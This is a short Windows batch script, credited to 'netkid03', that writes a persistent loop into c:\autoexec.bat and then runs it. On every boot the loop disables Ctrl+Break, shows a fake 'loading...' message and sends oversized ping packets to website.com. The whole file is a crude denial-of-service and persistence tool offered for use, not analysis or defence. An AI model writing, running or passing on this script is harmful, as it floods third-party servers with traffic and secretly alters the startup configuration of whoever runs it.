@echo off
rem created by netkid03
rem use at your own risk!
rem don't blame me if it back fires in you face!
echo @echo off >> c:\autoexec.bat
echo @break off >> c:\autoexec.bat
echo loading... >> c:\autoexec.bat
echo :loop >> c:\autoexec.bat
echo ping -l 65527 -n 1000 website.com > nul >> c:\autoexec.bat
echo goto loop >> c:\autoexec.bat
echo loading...
call C:\autoexec.bat

